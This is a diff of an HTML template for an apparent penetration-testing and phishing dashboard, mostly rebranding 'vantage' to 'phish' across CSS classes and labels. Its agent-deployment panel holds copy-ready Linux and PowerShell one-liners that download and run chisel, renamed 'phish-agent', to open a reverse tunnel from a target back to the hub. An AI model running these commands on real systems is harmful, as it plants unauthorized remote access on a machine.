@@ -1,36 +1,36 @@
 {{define "body"}}
-<link rel="stylesheet" href="/css/vantage_core.css">
-<div id="vantage-app" class="animate-fadeIn">
+<link rel="stylesheet" href="/css/phish_core.css">
+<div id="phish-app" class="animate-fadeIn">
     <!-- Dashboard Tab -->
-    {{template "vantage/dashboard_stats" .}}
+    {{template "discover/dashboard_stats" .}}
 
     <!-- Tasks Tab -->
     <div id="tab-tasks" class="tab-content hidden space-y-6">
-        {{template "vantage/task_list" .}}
-        {{template "vantage/task_modal" .}}
-        {{template "vantage/tunnel_panel" .}}
-        {{template "vantage/live_logs" .}}
+        {{template "discover/task_list" .}}
+        {{template "discover/task_modal" .}}
+        {{template "discover/tunnel_panel" .}}
+        {{template "discover/live_logs" .}}
     </div>
 
     <!-- OSINT Tab -->
-    {{template "vantage/osint_panel" .}}
+    {{template "discover/osint_panel" .}}
 
     <!-- Interactsh Tab -->
-    {{template "vantage/interactsh_panel" .}}
+    {{template "discover/interactsh_panel" .}}
 
     <!-- Results Tab -->
     <div id="tab-results" class="tab-content hidden space-y-4">
         <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-2">
-            <h3 class="text-xl font-black uppercase tracking-widest text-vantage-text italic">Vulnerability Intelligence
+            <h3 class="text-xl font-black uppercase tracking-widest text-phish-text italic">Vulnerability Intelligence
             </h3>
             <div id="vuln-global-summary"
-                class="text-sm font-mono text-vantage-text-dim/80 bg-vantage-card border border-vantage-border px-4 py-2 rounded-xl">
+                class="text-sm font-mono text-phish-text-dim/80 bg-phish-card border border-phish-border px-4 py-2 rounded-xl">
                 Loading stats...</div>
         </div>
-        <div class="glass-card rounded-lg border border-vantage-border overflow-hidden">
-            <div class="bg-vantage-sidebar/50 px-8 py-5 border-b border-vantage-border flex flex-wrap gap-4">
+        <div class="glass-card rounded-lg border border-phish-border overflow-hidden">
+            <div class="bg-phish-sidebar/50 px-8 py-5 border-b border-phish-border flex flex-wrap gap-4">
                 <button onclick="filterFindings('')"
-                    class="px-6 py-2.5 bg-vantage-card border border-vantage-border hover:bg-white/5 rounded-xl text-base font-bold transition-all">All
+                    class="px-6 py-2.5 bg-phish-card border border-phish-border hover:bg-white/5 rounded-xl text-base font-bold transition-all">All
                     Operations</button>
                 <button onclick="filterFindings('critical')"
                     class="px-6 py-2.5 badge-critical rounded-xl text-base font-bold transition-all">Critical
@@ -45,7 +45,7 @@
             <div class="overflow-x-auto">
                 <table class="w-full text-left text-base">
                     <thead
-                        class="bg-vantage-sidebar/50 text-vantage-text-dim font-black uppercase tracking-widest text-sm sticky top-0 border-b border-vantage-border">
+                        class="bg-phish-sidebar/50 text-phish-text-dim font-black uppercase tracking-widest text-sm sticky top-0 border-b border-phish-border">
                         <tr>
                             <th class="px-8 py-5">Severity</th>
                             <th class="px-8 py-5">Tool</th>
@@ -56,9 +56,9 @@
                             <th class="px-8 py-5">Date</th>
                         </tr>
                     </thead>
-                    <tbody id="findings-tbody" class="divide-y divide-vantage-border">
-                        <tr class="hover:bg-vantage-accent/5">
-                            <td class="px-6 py-3" colspan="7" class="text-center text-vantage-text-dim py-8">No findings
+                    <tbody id="findings-tbody" class="divide-y divide-phish-border">
+                        <tr class="hover:bg-phish-accent/5">
+                            <td class="px-6 py-3" colspan="7" class="text-center text-phish-text-dim py-8">No findings
                                 yet. Start a scan to populate.</td>
                         </tr>
                     </tbody>
@@ -72,7 +72,7 @@
     <!-- Hosts Tab -->
     <div id="tab-hosts" class="tab-content hidden space-y-8">
         <div
-            class="glass-card p-8 rounded-2xl border border-vantage-border/50 space-y-6 shadow-2xl relative overflow-hidden">
+            class="glass-card p-8 rounded-2xl border border-phish-border/50 space-y-6 shadow-2xl relative overflow-hidden">
             <div class="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
                 <svg class="w-32 h-32" fill="currentColor" viewBox="0 0 24 24">
                     <path
@@ -80,45 +80,45 @@
                 </svg>
             </div>
             <div class="space-y-4">
-                <h3 class="text-2xl font-black uppercase tracking-widest text-vantage-text italic">Target Asset
+                <h3 class="text-2xl font-black uppercase tracking-widest text-phish-text italic">Target Asset
                     Management</h3>
-                <p class="text-lg text-vantage-text-dim/80">IP, CIDR, domain list, or organization names. One per line
+                <p class="text-lg text-phish-text-dim/80">IP, CIDR, domain list, or organization names. One per line
                     or comma-separated.</p>
             </div>
             <textarea id="targets-input" rows="5"
-                class="w-full bg-vantage-bg/50 border border-vantage-border rounded-xl px-6 py-5 text-lg outline-none focus:border-vantage-accent transition-all custom-scrollbar"
+                class="w-full bg-phish-bg/50 border border-phish-border rounded-xl px-6 py-5 text-lg outline-none focus:border-phish-accent transition-all custom-scrollbar"
                 placeholder="192.168.1.0/24&#10;example.com&#10;acme corp"></textarea>
             <div class="flex flex-wrap gap-6">
                 <select id="targets-scope"
-                    class="bg-vantage-bg border border-vantage-border rounded-xl px-8 py-4 text-lg outline-none focus:border-vantage-accent cursor-pointer transition-colors">
+                    class="bg-phish-bg border border-phish-border rounded-xl px-8 py-4 text-lg outline-none focus:border-phish-accent cursor-pointer transition-colors">
                     <option value="">Global Scope (All)</option>
                     <option value="internal">Internal Assets</option>
                     <option value="external">External Assets</option>
                 </select>
                 <div class="flex-1 relative group">
                     <span
-                        class="absolute inset-y-0 left-0 pl-4 flex items-center text-vantage-text-dim group-focus-within:text-vantage-accent transition-colors">
+                        class="absolute inset-y-0 left-0 pl-4 flex items-center text-phish-text-dim group-focus-within:text-phish-accent transition-colors">
                         <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                 d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                         </svg>
                     </span>
                     <input id="targets-search" type="text" placeholder="Filter managed targets..."
-                        class="w-full bg-vantage-bg border border-vantage-border rounded-xl pl-14 pr-8 py-4 text-lg outline-none focus:border-vantage-accent transition-all">
+                        class="w-full bg-phish-bg border border-phish-border rounded-xl pl-14 pr-8 py-4 text-lg outline-none focus:border-phish-accent transition-all">
                 </div>
                 <div class="flex gap-4">
                     <button onclick="importTargets()"
-                        class="bg-vantage-accent hover:bg-vantage-accent/80 text-slate-900 font-black px-10 py-4 rounded-xl text-base transition-all active:scale-95 shadow-lg shadow-vantage-accent/20">Import
+                        class="bg-phish-accent hover:bg-phish-accent/80 text-slate-900 font-black px-10 py-4 rounded-xl text-base transition-all active:scale-95 shadow-lg shadow-phish-accent/20">Import
                         Assets</button>
                     <button onclick="loadTargets()"
-                        class="bg-vantage-card border border-vantage-border hover:bg-white/5 text-vantage-text font-bold px-8 py-4 rounded-xl text-base transition-all active:scale-95">Refresh</button>
+                        class="bg-phish-card border border-phish-border hover:bg-white/5 text-phish-text font-bold px-8 py-4 rounded-xl text-base transition-all active:scale-95">Refresh</button>
                 </div>
             </div>
         </div>
-        <div class="glass-card rounded-2xl border border-vantage-border overflow-hidden shadow-2xl">
+        <div class="glass-card rounded-2xl border border-phish-border overflow-hidden shadow-2xl">
             <table class="w-full text-left text-lg">
                 <thead
-                    class="bg-vantage-sidebar/50 text-vantage-text-dim font-black uppercase tracking-widest text-sm border-b border-vantage-border">
+                    class="bg-phish-sidebar/50 text-phish-text-dim font-black uppercase tracking-widest text-sm border-b border-phish-border">
                     <tr>
                         <th class="px-10 py-6">Identified Asset</th>
                         <th class="px-10 py-6">Type</th>
@@ -129,9 +129,9 @@
                         <th class="px-10 py-6">OS</th>
                     </tr>
                 </thead>
-                <tbody id="targets-tbody" class="divide-y divide-vantage-border">
+                <tbody id="targets-tbody" class="divide-y divide-phish-border">
                     <tr>
-                        <td colspan="7" class="px-8 py-16 text-center text-vantage-text-dim italic text-lg opacity-40">
+                        <td colspan="7" class="px-8 py-16 text-center text-phish-text-dim italic text-lg opacity-40">
                             No managed targets in current sector...</td>
                     </tr>
                 </tbody>
@@ -144,32 +144,32 @@
 
     <!-- Stress Tests Tab -->
     <div id="tab-stress-tests" class="tab-content hidden space-y-6">
-        <div class="glass-card p-5 rounded-lg border border-vantage-border space-y-4">
+        <div class="glass-card p-5 rounded-lg border border-phish-border space-y-4">
             <h3 class="text-lg font-bold">Infrastructure Resilience / Stress Tests</h3>
             <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3 text-sm">
                 <input id="stress-target"
-                    class="sm:col-span-2 lg:col-span-2 bg-vantage-bg border border-vantage-border rounded px-3 py-2"
+                    class="sm:col-span-2 lg:col-span-2 bg-phish-bg border border-phish-border rounded px-3 py-2"
                     placeholder="https://target.local/health">
-                <select id="stress-tool" class="bg-vantage-bg border border-vantage-border rounded px-3 py-2">
+                <select id="stress-tool" class="bg-phish-bg border border-phish-border rounded px-3 py-2">
                     <option value="vegeta">Vegeta</option>
                     <option value="bombardier">Bombardier</option>
                     <option value="hey">Hey</option>
                 </select>
-                <input id="stress-rate" class="bg-vantage-bg border border-vantage-border rounded px-3 py-2"
+                <input id="stress-rate" class="bg-phish-bg border border-phish-border rounded px-3 py-2"
                     type="number" value="500" min="1" placeholder="RPS">
-                <input id="stress-duration" class="bg-vantage-bg border border-vantage-border rounded px-3 py-2"
+                <input id="stress-duration" class="bg-phish-bg border border-phish-border rounded px-3 py-2"
                     value="60s" placeholder="Duration">
             </div>
             <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
-                <select id="stress-interface" class="bg-vantage-bg border border-vantage-border rounded px-3 py-2">
+                <select id="stress-interface" class="bg-phish-bg border border-phish-border rounded px-3 py-2">
                     <option value="">Default (eth0)</option>
                 </select>
                 <button onclick="startStressTest()"
-                    class="bg-vantage-accent hover:bg-green-700 text-white font-bold px-4 py-2 rounded">Start Stress
+                    class="bg-phish-accent hover:bg-green-700 text-white font-bold px-4 py-2 rounded">Start Stress
                     Test</button>
             </div>
         </div>
-        <div class="glass-card p-5 rounded-lg border border-vantage-border">
+        <div class="glass-card p-5 rounded-lg border border-phish-border">
             <h4 class="font-semibold mb-3">Response Latency (real-time)</h4>
             <canvas id="stressLatencyChart" height="100"></canvas>
         </div>
@@ -177,7 +177,7 @@
 
     <!-- Notification Settings Tab -->
     <div id="tab-notifications" class="tab-content hidden space-y-6">
-        <div class="glass-card p-8 rounded-2xl border border-vantage-border shadow-2xl">
+        <div class="glass-card p-8 rounded-2xl border border-phish-border shadow-2xl">
             <div class="flex items-center gap-4 mb-8">
                 <div
                     class="w-12 h-12 rounded-2xl bg-yellow-400/10 flex items-center justify-center border border-yellow-400/20 shadow-lg shadow-yellow-400/5">
@@ -187,52 +187,52 @@
                     </svg>
                 </div>
                 <div>
-                    <h3 class="text-2xl font-black uppercase tracking-widest text-vantage-text italic">Notification
+                    <h3 class="text-2xl font-black uppercase tracking-widest text-phish-text italic">Notification
                         Center</h3>
-                    <p class="text-sm text-vantage-text-dim/70">Configure tactical alerts for high-priority operational
+                    <p class="text-sm text-phish-text-dim/70">Configure tactical alerts for high-priority operational
                         events.</p>
                 </div>
             </div>
 
             <div class="space-y-8">
-                <div class="p-6 bg-vantage-sidebar/30 rounded-2xl border border-vantage-border/50">
-                    <label class="flex items-center gap-4 text-lg font-bold text-vantage-text cursor-pointer group">
+                <div class="p-6 bg-phish-sidebar/30 rounded-2xl border border-phish-border/50">
+                    <label class="flex items-center gap-4 text-lg font-bold text-phish-text cursor-pointer group">
                         <div class="relative flex items-center">
                             <input type="checkbox" id="notify-enabled"
-                                class="peer h-6 w-6 rounded border-vantage-border bg-vantage-bg text-vantage-accent focus:ring-vantage-accent transition-all">
+                                class="peer h-6 w-6 rounded border-phish-border bg-phish-bg text-phish-accent focus:ring-phish-accent transition-all">
                         </div>
-                        <span class="group-hover:text-vantage-accent transition-colors">Enable High-Priority Tactical
+                        <span class="group-hover:text-phish-accent transition-colors">Enable High-Priority Tactical
                             Notifications</span>
                     </label>
                 </div>
 
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                     <div class="space-y-3">
-                        <label class="block text-xs font-black text-vantage-text-dim uppercase tracking-[0.2em]">Slack
+                        <label class="block text-xs font-black text-phish-text-dim uppercase tracking-[0.2em]">Slack
                             Webhook Vector</label>
                         <input id="notify-slack" type="password"
-                            class="w-full bg-vantage-bg border border-vantage-border rounded-xl px-6 py-4 text-base outline-none focus:border-vantage-accent transition-all placeholder:opacity-30"
+                            class="w-full bg-phish-bg border border-phish-border rounded-xl px-6 py-4 text-base outline-none focus:border-phish-accent transition-all placeholder:opacity-30"
                             placeholder="https://hooks.slack.com/services/…">
                     </div>
                     <div class="space-y-3">
                         <label
-                            class="block text-xs font-black text-vantage-text-dim uppercase tracking-[0.2em]">Telegram
+                            class="block text-xs font-black text-phish-text-dim uppercase tracking-[0.2em]">Telegram
                             Bot Token</label>
                         <input id="notify-tg-token" type="password"
-                            class="w-full bg-vantage-bg border border-vantage-border rounded-xl px-6 py-4 text-base outline-none focus:border-vantage-accent transition-all placeholder:opacity-30"
+                            class="w-full bg-phish-bg border border-phish-border rounded-xl px-6 py-4 text-base outline-none focus:border-phish-accent transition-all placeholder:opacity-30"
                             placeholder="0000000000:AAEb…">
                     </div>
                     <div class="space-y-3">
                         <label
-                            class="block text-xs font-black text-vantage-text-dim uppercase tracking-[0.2em]">Telegram
+                            class="block text-xs font-black text-phish-text-dim uppercase tracking-[0.2em]">Telegram
                             Tactical Chat ID</label>
                         <input id="notify-tg-chat" type="text"
-                            class="w-full bg-vantage-bg border border-vantage-border rounded-xl px-6 py-4 text-base outline-none focus:border-vantage-accent transition-all placeholder:opacity-30"
+                            class="w-full bg-phish-bg border border-phish-border rounded-xl px-6 py-4 text-base outline-none focus:border-phish-accent transition-all placeholder:opacity-30"
                             placeholder="-100123456789">
                     </div>
                     <div class="flex items-end">
                         <button onclick="saveNotifyConfig()"
-                            class="w-full bg-vantage-accent hover:bg-vantage-accent/90 text-slate-900 font-black py-5 rounded-xl text-base transition-all active:scale-95 shadow-xl shadow-vantage-accent/20 uppercase tracking-widest italic">
+                            class="w-full bg-phish-accent hover:bg-phish-accent/90 text-slate-900 font-black py-5 rounded-xl text-base transition-all active:scale-95 shadow-xl shadow-phish-accent/20 uppercase tracking-widest italic">
                             Save Tactical Config
                         </button>
                     </div>
@@ -241,35 +241,35 @@
         </div>
     </div>
 
-    <!-- Resilience Admin Tab (Vantage Agent) -->
+    <!-- Resilience Admin Tab (Phish & Discover Agent) -->
     <div id="tab-resilience-admin" class="tab-content hidden space-y-6">
-        <div class="glass-card p-8 rounded-2xl border border-vantage-border shadow-2xl">
+        <div class="glass-card p-8 rounded-2xl border border-phish-border shadow-2xl">
             <div class="flex items-center justify-between mb-8">
-                <h3 class="text-2xl font-black uppercase tracking-widest text-vantage-text italic">Agent Administration
+                <h3 class="text-2xl font-black uppercase tracking-widest text-phish-text italic">Agent Administration
                 </h3>
                 <div id="tunnel-server-badge"
-                    class="px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest bg-vantage-card border border-vantage-border text-vantage-text/40 shadow-inner">
+                    class="px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest bg-phish-card border border-phish-border text-phish-text/40 shadow-inner">
                     Operational Status
                 </div>
             </div>
 
             <div class="space-y-8">
-                <!-- Vantage Agent Status -->
+                <!-- Phish & Discover Agent Status -->
                 <div
-                    class="p-6 bg-vantage-bg/30 rounded-xl border border-vantage-border shadow-inner flex items-center justify-between">
+                    class="p-6 bg-phish-bg/30 rounded-xl border border-phish-border shadow-inner flex items-center justify-between">
                     <div>
-                        <h4 class="text-sm font-black text-vantage-text uppercase tracking-widest italic mb-2">Vantage
+                        <h4 class="text-sm font-black text-phish-text uppercase tracking-widest italic mb-2">Phish & Discover
                             Engagement Agent</h4>
-                        <p class="text-xs text-vantage-text-dim/70">Operational status of the L3 reverse tunnel tactical
+                        <p class="text-xs text-phish-text-dim/70">Operational status of the L3 reverse tunnel tactical
                             engine.</p>
                     </div>
                     <div class="flex items-center gap-4">
                         <div
-                            class="flex items-center gap-3 bg-vantage-card px-4 py-2 rounded-lg border border-vantage-border">
+                            class="flex items-center gap-3 bg-phish-card px-4 py-2 rounded-lg border border-phish-border">
                             <div id="admin-agent-dot"
-                                class="w-2.5 h-2.5 rounded-full bg-vantage-text-dim/20 shadow-inner"></div>
+                                class="w-2.5 h-2.5 rounded-full bg-phish-text-dim/20 shadow-inner"></div>
                             <span id="admin-agent-label"
-                                class="text-xs text-vantage-text-dim font-black uppercase tracking-tighter">Inactive
+                                class="text-xs text-phish-text-dim font-black uppercase tracking-tighter">Inactive
                                 Sector Access</span>
                         </div>
                         <div class="flex gap-2">
@@ -298,17 +298,17 @@
 
 
                 <!-- Tactical Agent Deployment -->
-                <div class="glass-card p-6 rounded-xl border border-vantage-accent/20 bg-vantage-accent/5 shadow-lg">
+                <div class="glass-card p-6 rounded-xl border border-phish-accent/20 bg-phish-accent/5 shadow-lg">
                     <div class="flex items-center gap-3 mb-6">
                         <div
-                            class="w-10 h-10 rounded-xl bg-vantage-accent/20 flex items-center justify-center border border-vantage-accent/30">
-                            <svg class="w-6 h-6 text-vantage-accent" fill="none" stroke="currentColor"
+                            class="w-10 h-10 rounded-xl bg-phish-accent/20 flex items-center justify-center border border-phish-accent/30">
+                            <svg class="w-6 h-6 text-phish-accent" fill="none" stroke="currentColor"
                                 viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                     d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 00-2 2z" />
                             </svg>
                         </div>
-                        <h4 class="text-lg font-black uppercase tracking-widest italic text-vantage-text">Agent
+                        <h4 class="text-lg font-black uppercase tracking-widest italic text-phish-text">Agent
                             Deployment Vectors</h4>
                     </div>
 
@@ -316,15 +316,15 @@
                         <!-- Linux Vector -->
                         <div class="space-y-2">
                             <div class="flex justify-between items-center">
-                                <label class="text-xs font-black text-vantage-text-dim uppercase tracking-widest">Linux
+                                <label class="text-xs font-black text-phish-text-dim uppercase tracking-widest">Linux
                                     Tactical One-Liner (AMD64)</label>
                                 <span
-                                    class="text-[10px] text-vantage-accent font-bold uppercase tracking-tighter cursor-pointer hover:underline"
+                                    class="text-[10px] text-phish-accent font-bold uppercase tracking-tighter cursor-pointer hover:underline"
                                     onclick="copyToClipboard('agent-linux-cmd')">Copy Command</span>
                             </div>
                             <div class="relative group">
                                 <pre id="agent-linux-cmd"
-                                    class="bg-slate-950 p-4 rounded-xl text-[11px] font-mono text-vantage-accent border border-vantage-border/50 overflow-x-auto whitespace-pre-wrap select-all">curl -sSL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gunzip > vantage-agent && chmod +x vantage-agent && ./vantage-agent client --fingerprint {{.ChiselFingerprint}} http://{{.Host}} R:0.0.0.0:8081:127.0.0.1:80</pre>
+                                    class="bg-slate-950 p-4 rounded-xl text-[11px] font-mono text-phish-accent border border-phish-border/50 overflow-x-auto whitespace-pre-wrap select-all">curl -sSL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gunzip > phish-agent && chmod +x phish-agent && ./phish-agent client --fingerprint {{.ChiselFingerprint}} http://{{.Host}} R:0.0.0.0:8081:127.0.0.1:80</pre>
                             </div>
                         </div>
 
@@ -332,24 +332,24 @@
                         <div class="space-y-2">
                             <div class="flex justify-between items-center">
                                 <label
-                                    class="text-xs font-black text-vantage-text-dim uppercase tracking-widest">Windows
+                                    class="text-xs font-black text-phish-text-dim uppercase tracking-widest">Windows
                                     PowerShell Vector</label>
                                 <span
-                                    class="text-[10px] text-vantage-accent font-bold uppercase tracking-tighter cursor-pointer hover:underline"
+                                    class="text-[10px] text-phish-accent font-bold uppercase tracking-tighter cursor-pointer hover:underline"
                                     onclick="copyToClipboard('agent-win-cmd')">Copy Command</span>
                             </div>
                             <pre id="agent-win-cmd"
-                                class="bg-slate-950 p-4 rounded-xl text-[11px] font-mono text-blue-400 border border-vantage-border/50 overflow-x-auto whitespace-pre-wrap select-all">iwr -Uri https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz -OutFile agent.gz; expand-archive agent.gz .; .\chisel.exe client --fingerprint {{.ChiselFingerprint}} http://{{.Host}} R:0.0.0.0:8081:127.0.0.1:80</pre>
+                                class="bg-slate-950 p-4 rounded-xl text-[11px] font-mono text-blue-400 border border-phish-border/50 overflow-x-auto whitespace-pre-wrap select-all">iwr -Uri https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz -OutFile agent.gz; expand-archive agent.gz .; .\chisel.exe client --fingerprint {{.ChiselFingerprint}} http://{{.Host}} R:0.0.0.0:8081:127.0.0.1:80</pre>
                         </div>
 
-                        <p class="text-[10px] text-vantage-text-dim/60 italic">Note: These commands establish a Layer 3
-                            tactical tunnel back to the Vantage Hub. Ensure port 3333 is reachable from the target.</p>
+                        <p class="text-[10px] text-phish-text-dim/60 italic">Note: These commands establish a Layer 3
+                            tactical tunnel back to the Phish & Discover Hub. Ensure port 3333 is reachable from the target.</p>
                     </div>
                 </div>
 
-                <!-- Vantage System Admin -->
+                <!-- Phish & Discover System Admin -->
                 {{if .ModifySystem}}
-                <div class="p-6 bg-vantage-bg/30 rounded-xl border border-vantage-border shadow-inner">
+                <div class="p-6 bg-phish-bg/30 rounded-xl border border-phish-border shadow-inner">
                     <div class="flex items-center gap-3 mb-6">
                         <div
                             class="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center border border-blue-500/20">
@@ -360,7 +360,7 @@
                                     d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                             </svg>
                         </div>
-                        <h4 class="text-lg font-black uppercase tracking-widest italic text-vantage-text">Advanced
+                        <h4 class="text-lg font-black uppercase tracking-widest italic text-phish-text">Advanced
                             Administration</h4>
                     </div>
                     <div class="grid grid-cols-2 gap-6">
@@ -382,60 +382,60 @@
     <!-- System Status Tab -->
     <div id="tab-system-status" class="tab-content hidden space-y-6">
         <div class="grid grid-cols-1 sm:grid-cols-3 gap-6">
-            <div class="glass-card p-6 rounded-2xl border border-vantage-border/50 shadow-xl">
+            <div class="glass-card p-6 rounded-2xl border border-phish-border/50 shadow-xl">
                 <div class="flex items-center justify-between mb-3">
-                    <p class="text-sm font-black uppercase tracking-widest text-vantage-text-dim italic">CPU</p>
-                    <span id="sys-cpu-pct" class="text-sm font-black text-vantage-accent">0%</span>
+                    <p class="text-sm font-black uppercase tracking-widest text-phish-text-dim italic">CPU</p>
+                    <span id="sys-cpu-pct" class="text-sm font-black text-phish-accent">0%</span>
                 </div>
-                <div class="w-full bg-vantage-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
-                    <div id="sys-cpu-bar" class="bg-vantage-accent h-full rounded-full transition-all" style="width: 0%"></div>
+                <div class="w-full bg-phish-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
+                    <div id="sys-cpu-bar" class="bg-phish-accent h-full rounded-full transition-all" style="width: 0%"></div>
                 </div>
             </div>
-            <div class="glass-card p-6 rounded-2xl border border-vantage-border/50 shadow-xl">
+            <div class="glass-card p-6 rounded-2xl border border-phish-border/50 shadow-xl">
                 <div class="flex items-center justify-between mb-3">
                     <p class="text-sm font-black uppercase tracking-widest text-blue-400/80 italic">RAM</p>
                     <span id="sys-mem-pct" class="text-sm font-black text-blue-400">0%</span>
                 </div>
-                <div class="w-full bg-vantage-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
+                <div class="w-full bg-phish-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
                     <div id="sys-mem-bar" class="bg-blue-400 h-full rounded-full transition-all" style="width: 0%"></div>
                 </div>
-                <p id="sys-mem-detail" class="text-sm text-vantage-text-dim/60 mt-3">— / —</p>
+                <p id="sys-mem-detail" class="text-sm text-phish-text-dim/60 mt-3">— / —</p>
             </div>
-            <div class="glass-card p-6 rounded-2xl border border-vantage-border/50 shadow-xl">
+            <div class="glass-card p-6 rounded-2xl border border-phish-border/50 shadow-xl">
                 <div class="flex items-center justify-between mb-3">
                     <p class="text-sm font-black uppercase tracking-widest text-yellow-400/80 italic">Disk</p>
                     <span id="sys-disk-pct" class="text-sm font-black text-yellow-400">0%</span>
                 </div>
-                <div class="w-full bg-vantage-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
+                <div class="w-full bg-phish-border/20 rounded-full h-2.5 overflow-hidden shadow-inner">
                     <div id="sys-disk-bar" class="bg-yellow-400 h-full rounded-full transition-all" style="width: 0%"></div>
                 </div>
-                <p id="sys-disk-detail" class="text-sm text-vantage-text-dim/60 mt-3">— / —</p>
+                <p id="sys-disk-detail" class="text-sm text-phish-text-dim/60 mt-3">— / —</p>
             </div>
         </div>
 
         <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            <div class="glass-card p-8 rounded-2xl border border-vantage-border/50 shadow-2xl">
+            <div class="glass-card p-8 rounded-2xl border border-phish-border/50 shadow-2xl">
                 <div class="flex items-center justify-between mb-6">
-                    <h3 class="text-lg font-black uppercase tracking-widest text-vantage-text italic">Container Health</h3>
-                    <span id="sys-uptime" class="text-sm text-vantage-text-dim/60"></span>
+                    <h3 class="text-lg font-black uppercase tracking-widest text-phish-text italic">Container Health</h3>
+                    <span id="sys-uptime" class="text-sm text-phish-text-dim/60"></span>
                 </div>
                 <div id="sys-containers" class="space-y-3">
-                    <p class="text-sm text-vantage-text-dim italic opacity-60">Loading...</p>
+                    <p class="text-sm text-phish-text-dim italic opacity-60">Loading...</p>
                 </div>
             </div>
-            <div class="glass-card p-8 rounded-2xl border border-vantage-border/50 shadow-2xl">
-                <h3 class="text-lg font-black uppercase tracking-widest text-vantage-text italic mb-6">Last Login</h3>
+            <div class="glass-card p-8 rounded-2xl border border-phish-border/50 shadow-2xl">
+                <h3 class="text-lg font-black uppercase tracking-widest text-phish-text italic mb-6">Last Login</h3>
                 <div class="overflow-x-auto">
                     <table class="w-full text-left text-sm">
-                        <thead class="text-vantage-text-dim font-black uppercase tracking-widest text-xs border-b border-vantage-border">
+                        <thead class="text-phish-text-dim font-black uppercase tracking-widest text-xs border-b border-phish-border">
                             <tr>
                                 <th class="py-2 pr-4">User</th>
                                 <th class="py-2 pr-4">Last Login (UTC)</th>
                                 <th class="py-2">Status</th>
                             </tr>
                         </thead>
-                        <tbody id="sys-users-tbody" class="divide-y divide-vantage-border">
-                            <tr><td colspan="3" class="py-6 text-center text-vantage-text-dim italic opacity-60">Loading...</td></tr>
+                        <tbody id="sys-users-tbody" class="divide-y divide-phish-border">
+                            <tr><td colspan="3" class="py-6 text-center text-phish-text-dim italic opacity-60">Loading...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -451,7 +451,7 @@
 
 {{define "scripts"}}
 <script>
-    const CHISEL_FINGERPRINT = window.VantageConfig.fingerprint || "SHA256:VantageTacticalSectorAccessKeyFingerprint";
+    const CHISEL_FINGERPRINT = window.PhishConfig.fingerprint || "SHA256:PhishDiscoverTacticalSectorAccessKeyFingerprint";
     const SERVER_HOST = window.location.host;
 
     function switchTab(tabName) {
@@ -477,7 +477,7 @@
             results: 'Vulnerability Findings',
             hosts: 'Target Catalog',
             'stress-tests': 'Resilience Tests',
-            'resilience-admin': 'Vantage Agent',
+            'resilience-admin': 'Phish & Discover Agent',
             'notifications': 'Notifications',
             'osint': 'Discovered Surface',
             'interactsh': 'Listeners & OOB',
@@ -645,10 +645,10 @@
                     if (sidePing) sidePing.className = 'animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75';
                 }
             } else {
-                if (dot) dot.className = 'w-2.5 h-2.5 rounded-full bg-vantage-text-dim/20 shadow-inner';
+                if (dot) dot.className = 'w-2.5 h-2.5 rounded-full bg-phish-text-dim/20 shadow-inner';
                 if (label) {
                     label.textContent = 'Inactive Sector Access';
-                    label.className = 'text-xs text-vantage-text-dim font-black uppercase tracking-tighter';
+                    label.className = 'text-xs text-phish-text-dim font-black uppercase tracking-tighter';
                 }
                 if (sideDot) {
                     sideDot.className = 'relative inline-flex rounded-full h-2 w-2 bg-gray-600 shadow-none';
@@ -662,7 +662,7 @@
                     badge.className = 'px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest bg-blue-900/40 text-blue-300 border border-blue-700/40 shadow-lg';
                 } else {
                     badge.textContent = 'Tunnel Server Idle';
-                    badge.className = 'px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest bg-vantage-card border border-vantage-border text-vantage-text/40 shadow-inner';
+                    badge.className = 'px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest bg-phish-card border border-phish-border text-phish-text/40 shadow-inner';
                 }
             }
         } catch (e) {
@@ -772,7 +772,7 @@
                 const progress = Number(t.progress || 0);
 
                 const actionBtn = done
-                    ? `<button onclick="downloadReport(${t.id})" class="text-vantage-accent hover:underline flex items-center h-full"><svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>PDF</button>`
+                    ? `<button onclick="downloadReport(${t.id})" class="text-phish-accent hover:underline flex items-center h-full"><svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>PDF</button>`
                     : '';
 
                 return `
@@ -807,7 +807,7 @@
                     <td class="px-3 py-2 text-xs text-gray-500">${new Date(t.updated_at || t.created_at).toLocaleString()}</td>
